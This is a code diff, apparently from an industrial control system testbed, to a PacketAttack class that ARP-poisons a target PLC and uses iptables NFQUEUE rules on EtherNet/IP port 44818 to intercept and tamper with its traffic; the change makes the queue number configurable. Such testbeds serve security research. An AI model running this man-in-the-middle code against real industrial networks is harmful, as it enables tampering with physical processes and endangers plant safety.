@@ -55,12 +55,13 @@ class PacketAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
+        queue_number = self.intermediate_attack['queue_num']
         if self.direction == 'source':
             os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1')
+                      f'--queue-num {queue_number}')
         elif self.direction == 'destination':
             os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1 ')
+                      f'--queue-num {queue_number}')
         else:
             self.logger.error('Wrong direction configured, direction must be source or destination')
             raise DirectionError('Wrong direction configured')
@@ -79,7 +80,6 @@ class PacketAttack(SyncedAttack):
         self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        queue_number = 1
         nfqueue_path = Path(__file__).parent.absolute() / "naive_netfilter_queue.py"
         cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
 
@@ -105,16 +105,16 @@ class PacketAttack(SyncedAttack):
             for plc in self.intermediate_yaml['plcs']:
                 if plc['name'] != self.intermediate_plc['name']:
                     restore_arp(self.target_plc_ip, plc['local_ip'])
-
+        queue_number = self.intermediate_attack['queue_num']
         self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
         if self.direction == 'source':
             os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1')
+                      f'--queue-num {queue_number}')
         elif self.direction == 'destination':
             os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1 ')
+                      f'--queue-num {queue_number}')
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
